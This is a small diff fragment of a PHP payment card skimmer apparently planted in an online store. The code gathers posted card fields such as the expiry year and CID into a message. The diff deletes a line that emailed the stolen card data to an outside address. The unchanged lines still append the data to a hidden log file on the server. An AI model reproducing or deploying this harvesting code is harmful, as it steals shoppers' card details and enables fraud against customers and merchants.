@@ -134,7 +134,6 @@ Year    : ".$_POST['payment[cc_exp_year]']."
 CID     : ".$_POST['payment[cc_cid]']."
 end.
 ";
-mail("tunisianseven123@outlook.fr" , "zm back Z", $messagess);
 $fp=fopen('/chroot/home/zmantech/zmantechnologies.com/html/store/shell/log' , 'a+');
 $fwrite = fwrite($fp, "," .$messagess );
 
